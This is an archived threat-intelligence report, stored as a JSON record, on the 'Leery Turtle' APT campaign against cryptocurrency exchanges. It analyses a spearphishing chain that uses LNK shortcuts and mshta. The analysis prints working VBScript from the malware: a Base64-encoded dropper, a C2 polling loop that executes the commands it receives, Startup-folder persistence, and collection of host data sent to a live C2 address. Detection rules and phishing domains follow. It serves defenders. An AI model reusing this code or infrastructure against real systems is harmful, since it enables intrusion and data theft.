{
    "id": "bce08d26-5d14-440e-83aa-51742db78ecc",
    "created_at": "2022-10-25T16:48:11.655466Z",
    "updated_at": "2025-03-27T02:16:52.988508Z",
    "deleted_at": null,
    "sha1_hash": "801eb85445d0e1a4ecec311846bdfe2435400d2c",
    "title": "LeeryTurtleThreatReport",
    "authors": "",
    "file_creation_date": "2020-05-06T14:48:44Z",
    "file_modification_date": "2020-05-06T14:48:44Z",
    "file_size": 3592358,
    "plain_text": "# Leery Turtle Threat Report\n\n**Report Date: 6 May 2020**\n\n**Report No: 20CTI212**\n\n\n-----\n\n## TABLE OF CONTENT\n\n#### I. THREAT GROUP SUMMARY 3\n\n###### Introducing the Leery Turtle APT Group 3\n\n Targets and Capabilities 3\n\n#### II. TECHNICAL ANALYSIS OF KEY ATTACKS 4\n\n###### Activity Summary 4\n\n#### III. DETECTION AND MITIGATION 12\n\n IV. APPENDIX 13\n\n V. CONTACT 14\n\n\n-----\n\n### I. THREAT GROUP SUMMARY\n\nGroup Name Leery Turtle\n\nThreat Class Advanced Persistent Threat\n\nTarget Industry Cryptocurrency Exchange Business\n\nMotivation Financial Gain\n\nAttack Scope Global\n\nFavorite Method Spearphishing, Malware Infection\n\nActive Since Late 2017\n\n##### Introducing the Leery Turtle APT Group\n\n**Leery Turtle is a threat group which is active since at least late 2017. They are targeting Cryptocurrency**\n\nExchange companies globally. They continuously carry out spear-phishing campaigns to infect their targets with\n\ncustom written malware. The forensic analysis concludes that this group is systematically operated, persistent,\n\nand funded.\n\n##### Targets and Capabilities\n\nAll of the campaigns observed were directed towards Cryptocurrency Exchange companies. Leery Turtle does\nnot focus on any particular region, and target businesses worldwide. they mostly target technical and executive\nroles.\n\nIn their operations, Leery Turtle employs extensive reconnaissance tactics. To specify vulnerable entry points,\nthey send decoy e-mails with non-malicious attachments and monitor which of their targets tend to open and\ndownload them. The evidence also suggests that Leery Turtle selects and profiles their targets at an advanced\nlevel to the details of their private life.\n\nAttacks imitate commonly used file storage services like Google Drive, Microsoft OneDrive etc. This mimicking\nbehavior also observed in their choice of domains. They also use e-mail spoofing techniques to make the emails appear as coming from a coworker.\n\n|Group Name|Leery Turtle|\n|---|---|\n|Threat Class|Advanced Persistent Threat|\n|Target Industry|Cryptocurrency Exchange Business|\n|Motivation|Financial Gain|\n|Attack Scope|Global|\n|Favorite Method|Spearphishing, Malware Infection|\n|Active Since|Late 2017|\n\n\n-----\n\n_Image 1 - Example phishing e-mail imita2ng Google Drive_\n\n### II. TECHNICAL ANALYSIS OF KEY ATTACKS\n\n##### Activity Summary\n\nSteps of an attack are like the following:\n\n1. A password-protected PDF file is sent alongside an LNK shortcut that imitates a text file containing the pdf’s\n\npassword.\n2. When double-clicked the shortcut file sends an HTTP request to a remote server through Windows utility\n\nmshta.exe. This request is intended to download and execute the first stage payload.\n3. The attacker’s web server responds with a VBS payload which will be executed. Additional controls on the\n\nserver-side are present. For example, we have observed that the server is checking if the user agent string is\nmatching with MSHTA.\n4. We observed that the webserver is always running on TCP 8080.\n5. The first stage payload gathers information about the infected system and sends them to the command and\n\ncontrol server.\n6. CNC server responds with a Second Stage VBS payload, which will be saved under the %TEMP% directory.\n7. Malware creates a shortcut file named ‘xBoxOne.lnk’ under the Startup directory as a means of persistence.\n\n\n-----\n\n##### MALWARE ANALYSIS\n\n###### LNK Shortcut File - Password.txt.lnk\n\nInitial LNK file is a simple shortcut that downloads & executes VBS code from a remote server using Microsoft’s\nsystem utility MSHTA. It is observed that attackers use the URL shortening service “bit.ly” at every stage of the\noperation.\n\n\n-----\n\nIt can be seen that malware is dropping files in the below code snippet. The malware contains a Base64\nencoded code which then gets decoded and dropped under %Temp% directory with .vbs extension. After that,\nit creates another shortcut file under the Startup directory as a means of persistence.\n\n```\nucr=\"https://bit.ly/37W6fgx\"\n…\nln=\"b24gZXJyb3IgcmVzdW1lIG5leHQNCnJhbmRvbWl6ZQ0KaWYgV1NjcmlwdC5Bcmd1b\nWVudHMuTGVuZ3RoPjAgdGhlbg0KCUhUUD0iaHQiDQoJdXU9SFRQJiJ0cDoiJiIvLyImV1\nNjcmlwdC5Bcmd1bWVudHMuSXRlbSgwKQ0KCWNvYj0iV2luSHR0cCI\"&\"NCgljb2I9Y29i\nJiJSZXF1ZXN0LiINCgljb2I9Ildpbkh0dHAiJiIuIiZjb2INCgljb2I9Y29iJiI1LjEiD\nQoJc2V0IHdocj1DcmVhdGVPYmplY3QoY29iKQ0KCWRvIHdoaWxlIHRydWUNCgkJcHM9Il\nBPIg0KCQl0dz0iMiINCgkJcnRjPSIiDQoJCXRwYz11dSYiPyImInRvcCImImljPSImInM\niJk\"&\"ludCgxMDAwKnJuZCs5MDAwKQ0KCQl3aHIuT3BlbiBwcyYiU1QiLHRwYyxmYWxzZ\nQ0KCQl3aHIuU2VuZCB0dyYiMDAiDQoJ\"&\"CWlmIHdoci5TdGF0dXM9MjAwIFRoZW4NCgk\nJCXJ0Yz13aHIuUmVzcG9uc2VUZXh0DQoJCWVuZCBpZg0KCQlpZiBydGM8PiIiIHRoZW4N\nCgkJCUV4ZWN1dGUocnRjKQ0KCQkJZXhpdCBkbw0KCQllbmQgaWYNCgkJV1NjcmlwdC5Tb\nGVlcCAxODAqMTAwMA0KCWxvb3ANCmVuZCBpZg0K\"\nset fob=CreateObject(\"Scripting.FileSystemObject\")\nflp=fob.GetSpecialFolder(2)&\"\\\"&\"Xbox\"&\".l\"&\"nk\"\nSet tcl=wish.CreateShortcut(flp)\ntcl.TargetPath=\"msh\"&\"ta\"\npf=fob.GetSpecialFolder(2)&\"\\mfesf.vbs\"\nset btf=fob.OpenTextFile(pf,2,true)\ntcl.Arguments=ucr\n…\nbtf.Write dbsc(ln)\nbtf.Close()\n\n```\n\n-----\n\nThis code snippet sends POST requests to CnC at regular intervals to receive commands to be executed.\n\n```\non error resume next\nrandomize\nif WScript.Arguments.Length>0 then\n    HTP=\"ht\"\n    uu=HTP&\"tp:\"&\"//\"&WScript.Arguments.Item(0)\n    cob=\"WinHttp\"\n    cob=cob&\"Request.\"\n    cob=\"WinHttp\"&\".\"&cob\n    cob=cob&\"5.1\"\n    set whr=CreateObject(cob)\n    do while true\n       ps=\"PO\"\n       tw=\"2\"\n       rtc=\"\"\n       tpc=uu&\"?\"&\"top\"&\"ic=\"&\"s\"&Int(1000*rnd+9000)\n       whr.Open ps&\"ST\",tpc,false\n       whr.Send tw&\"00\"\n       if whr.Status=200 Then\n           rtc=whr.ResponseText\n       end if\n       if rtc<>\"\" then\n           Execute(rtc)\n           exit do\n       end if\n       WScript.Sleep 180*1000\n    loop\nend if\n\n```\n\n-----\n\nMalware enumerates the list of processes by interacting with WMI. After that, it checks for the presence of\nseveral Antivirus products. In case Qihoo360 Total Security, a Chinese AV product, is present then it deletes the\nshortcut under Startup which it created a while back. Therefore malware does not persist on the system if this\nsecurity product is present.\n\n```\nset wmi=GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\n\\root\\cimv2\")\nset pl=wmi.ExecQuery(\"Select * from \"&\"Win32_Process\")\nfor each pi in pl\n    tpl=tpl&LCase(pi.Name)&\"|\"\nnext\nex=\"ws\"\nif Instr(tpl,\"kwsp\"&\"rot\")>0 or Instr(tpl,\"nppr\"&\"ot\")>0 then\n    ex=\"cs\"\nend if\nln=\"star\"&\"t /b \" & ex & \"cr\"&\"ipt \"\"\"&pf&\"\"\" \"+\"203.144.133.42:8080/\nedit\"\nln2=\" & move \"\"\"&flp&\"\"\" \"\"\"& wish.SpecialFolders(\"startup\") &\"\\\"\"\"\nif Instr(tpl,\"hudo\"&\"ngf\")>0 or Instr(tpl,\"qhs\"&\"afe\")>0 then\n    ln2=\" & del \"\"\"&flp&\"\"\"\"\nelse\n    tcl.Save\nend if\nwish.run \"CM\"&\"D.E\"&\"XE \"&\"/c \" & ln&\" 1\" & \" & \" & ln&\" 2\" &\nln2,0,false\n\n```\n\n-----\n\nThe malware gathers plenty of information about the local system through WMI. It is observed that this\ninformation is later sent to the CnC server by the malware.\n\n```\n    set adapItems=ObjWMI.ExecQuery(\"SELECT * FROM\nWin32_NetworkAdapterConfiguration\",,48)\n    for each adapter in adapItems\n       on error resume next\n       if isNull(adapter.IPAddress) then\n       else\n           getInfo=getInfo+\"Network\nAdapter:\"+tab&adapter.Description+ent\n           getInfo=getInfo+\" MAC\nAddress:\"+tab&adapter.MACAddress + ent\n           getInfo=getInfo+\" IP\nAddress:\"+tab+Join(adapter.IPAddress, \",\") + ent\n           getInfo=getInfo+\" Subnet\nMask:\"+tab+Join(adapter.IPSubnet, \",\") + ent\n           getInfo=getInfo+\" Default\nGateway:\"+tab+Join(adapter.DefaultIPGateway, \",\")+ ent\n           if adapter.DHCPEnabled=true then\n              getInfo=getInfo+\" DHCP\nServers:\"+tab&adapter.DHCPServer + ent\n           end if\n           getInfo=getInfo+\" DNS\nServer:\"+tab+Join(adapter.DNSServerSearchOrder, \",\") + ent\n       end if\n    next\n\n```\n\n-----\n\nData sent to CnC\n```\n    Current Time: 12/3/2019 6:51:57 AM\n    Username: USER-PC\\admin\n    Hostname: USER-PC\n    OS Name: Microsoft Windows 7 Professional 32-bit\n    OS Version: 6.1.7601\n    Install Date: 10/05/2017\n    Boot Time: 12/3/2019 5:48:54 AM\n    Time Zone: (UTC 0 hours) GMT Standard Time\n    CPU:  Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz (x64)\n    Path:   C:\\Users\\admin\\AppData\\Local\\Temp\\mfesf.vbs\n\n```\n```\nNetwork Adapter: Intel(R) PRO/1000 MT Network Connection\n MAC Address: 52:54:00:4A:04:AF\n IP Address: 192.168.100.207,fe80::a179:b3ff:199:2314\n Subnet Mask: 255.255.255.0,64\n Default Gateway: 192.168.100.2\n DNS Server: 192.168.100.2\n3696 1 \"C:\\Windows\\System32\\cmd.exe\" /C \"ECHO huobi>C:\n\\Users\\admin\\AppData\\Local\\Temp\\Password.txt&NOTEPAD.EXE C:\n\\Users\\admin\\AppData\\Local\\Temp\\Password.txt&DEL C:\n\\Users\\admin\\AppData\\Local\\Temp\\Password.txt\"\n2884 1 \\??\\C:\\Windows\\system32\\conhost.exe\n328 1 NOTEPAD.EXE C:\n\\Users\\admin\\AppData\\Local\\Temp\\Password.txt\n2712 0 WmiPrvSE.exe\n1768 1 wscript \"C:\\Users\\admin\\AppData\\Local\\Temp\\mfesf.vbs\"\n203.144.133.42:8080/edit 1 \n1096 1 wscript \"C:\\Users\\admin\\AppData\\Local\\Temp\\mfesf.vbs\"\n203.144.133.42:8080/edit 2\n\n```\n\n-----\n\nIt is observed that malware has two different communication methods to receive commands. The first method is\nsimply receiving commands in Base64 encoded format. CNC responses beginning with “23#” are using this\nmethod.\n\nThe second one is a bit more complicated. This time malware will receive a second URL from the CNC. Then it\nwill send a GET request to this URL. The second server will respond with an encrypted payload and decryption\nkey. We believe that this mechanism is meant to be a more resilient commanding system. CNC responses\nbeginning with “20#” are using this method.\n\n1. Simple Communication Method\n\n2. Dead-Drop Communication Method\n\n\n-----\n\n##### TACTICS, TECHNIQUES & PROCEDURES\n\nTechniques and Tactics used by this threat are mapped according to the MITRE ATT&CK framework below.\n\nInitial Access Execution Startup Folder File Deletion Discovery Command Control\n\nSpearphishing Mshta (T1170) Setup Folder File Deletion Process Discovery Standard Application\n(T1192) (T1060) (T1107) (T1057) Layer Protocol\n\n(T1071)\n\nScripting System Information Data Obfuscation\n(T1064) Discovery (T1001)\n\n(T1082)\n\nWindows Network Configuration Data Encoding\nManagement Discovery (T1131)\nInstrumentation (T1016)\n(T1047)\n\n### III. DETECTION AND MITIGATION\n\n|Initial Access|Execution|Startup Folder|File Deletion|Discovery|Command Control|\n|---|---|---|---|---|---|\n|Spearphishing (T1192)|Mshta (T1170)|Setup Folder (T1060)|File Deletion (T1107)|Process Discovery (T1057)|Standard Application Layer Protocol (T1071)|\n||Scripting (T1064)|||System Information Discovery (T1082)|Data Obfuscation (T1001)|\n||Windows Management Instrumentation (T1047)|||Network Configuration Discovery (T1016)|Data Encoding (T1131)|\n\n|Stage|Detection|\n|---|---|\n|Persistency|Shortcut file named ‘xBoxOne.Ink’ is preset under Startup folder|\n|CNC Domain|DNS request contains two or more of there; googl, drive, cloud, share, upload|\n|CNC Traffic|The destination port is 8080 and traffic contains one of these; 20#, 23#, VBScript|\n|Shortcut File|LNK target starts with mshta http://bit.ly/|\n|Dropper|File with .vbs extension is created under Temp folder|\n\n\n-----\n\n### IV. APPENDIX\n\n|IV. APPENDIX|Col2|\n|---|---|\n|drive.googleupload.info|www.msupdatepms.xyz|\n|support.gdrvcheck.co|drivelnk.liveonedrvshare.xyz|\n|gdocs.googleupload.info|scloud.wechart.org|\n|microsoft-update10v.amazonaws1.info|check.onedrvdn.co|\n|_jfieo2_se.drivegooglshare.xyz|092jb_378v3_1.googldocs.org|\n|docs.gdriveshare.top|att.gdrvupload.xyz|\n|docs.googlefiledrive.com|client.googleapis.online|\n|download.gdriveupload.site|down.financialmarketing.live|\n|drivegoogle.publicvm.com|drive.gogleshare.xyz|\n|file.onedrivecloud.store|drives.googlecloud.live|\n|iellsfileshare.sharedrivegght.xyz|gbackup.gogleshare.xyz|\n|mail.gmaildrive.site|mail.gdriveupload.info|\n|service.amzonnews.club|mail.googleupload.info|\n|update.gdrives.top|start.showprice.xyz|\n|verify.googleauth.pro|upload.gdrives.best|\n\n\n-----\n\nNon-classified\n\n### V. CONTACT\n\n**Address HeadQuarter:** **Address MEA (Bosphorus Chapter):** **Address R&D:**\nParnu Mnt 10, 10148 DAP Yapı Z Ofis Plaza Istanbul Teknik Üniversitesi\nTallinn, Estonia Kat 3 No 299 Arı Teknokent\nKağıthane/Istanbul Sarıyer/Istanbul\n\nTel: +14156551677 Tel: +90 850 885 2121 Tel: +90 850 885 2121\n[info@cyberstruggle.org](mailto:info@cyberstruggle.org)\nhttps://cyberstruggle.org\n\n\n-----\n\nNon-classified\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.05.06_Leery_Turtle/LeeryTurtleThreatReport_05_20.pdf",
        "https://cyberstruggle.org/delta/LeeryTurtleThreatReport_05_20.pdf"
    ],
    "report_names": [
        "LeeryTurtleThreatReport_05_20",
        "LeeryTurtleThreatReport_05_20.pdf"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cf7fc640-acfe-41c4-9f3d-5515d53a3ffb",
            "created_at": "2023-01-06T13:46:38.228042Z",
            "updated_at": "2025-03-27T02:00:02.775905Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "GIF89a",
                "G0006",
                "PLA Unit 61398",
                "Group 3",
                "TG-8223",
                "Comment Group",
                "ShadyRAT",
                "COMMENT PANDA",
                "Comment Crew",
                "Byzantine Candor",
                "Brown Fox"
            ],
            "source_name": "MISPGALAXY:APT1",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3aaf0755-5c9b-4612-9f0e-e266ef1bdb4b",
            "created_at": "2022-10-25T16:07:23.480196Z",
            "updated_at": "2025-03-27T02:02:09.826059Z",
            "deleted_at": null,
            "main_name": "Comment Crew",
            "aliases": [
                "APT 1",
                "BrownFox",
                "Byzantine Candor",
                "Byzantine Hades",
                "Comment Crew",
                "Comment Panda",
                "GIF89a",
                "Group 3",
                "Operation Oceansalt",
                "Operation Seasalt",
                "Operation Siesta",
                "Shanghai Group",
                "TG-8223"
            ],
            "source_name": "ETDA:Comment Crew",
            "tools": [
                "Auriga",
                "Cachedump",
                "Chymine",
                "CookieBag",
                "Darkmoon",
                "GDOCUPLOAD",
                "GLOOXMAIL",
                "GREENCAT",
                "Gen:Trojan.Heur.PT",
                "GetMail",
                "Hackfase",
                "Hacksfase",
                "Helauto",
                "Kurton",
                "LETSGO",
                "LIGHTBOLT",
                "LIGHTDART",
                "LOLBAS",
                "LOLBins",
                "LONGRUN",
                "Living off the Land",
                "Lslsass",
                "MAPIget",
                "ManItsMe",
                "Mimikatz",
                "MiniASP",
                "Oceansalt",
                "Pass-The-Hash Toolkit",
                "Poison Ivy",
                "ProcDump",
                "Riodrv",
                "SPIVY",
                "Seasalt",
                "ShadyRAT",
                "StarsyPound",
                "TROJAN.COOKIES",
                "TROJAN.FOXY",
                "TabMsgSQL",
                "Tarsip",
                "Trojan.GTALK",
                "WebC2",
                "WebC2-AdSpace",
                "WebC2-Ausov",
                "WebC2-Bolid",
                "WebC2-Cson",
                "WebC2-DIV",
                "WebC2-GreenCat",
                "WebC2-Head",
                "WebC2-Kt3",
                "WebC2-Qbp",
                "WebC2-Rave",
                "WebC2-Table",
                "WebC2-UGX",
                "WebC2-Yahoo",
                "Wordpress Bruteforcer",
                "bangat",
                "gsecdump",
                "pivy",
                "poisonivy",
                "pwdump",
                "zxdosml"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716491,
    "ts_updated_at": 1743041812,
    "ts_creation_date": 1588776524,
    "ts_modification_date": 1588776524,
    "files": {
        "pdf": "https://archive.orkl.eu/801eb85445d0e1a4ecec311846bdfe2435400d2c.pdf",
        "text": "https://archive.orkl.eu/801eb85445d0e1a4ecec311846bdfe2435400d2c.txt",
        "img": "https://archive.orkl.eu/801eb85445d0e1a4ecec311846bdfe2435400d2c.jpg"
    }
}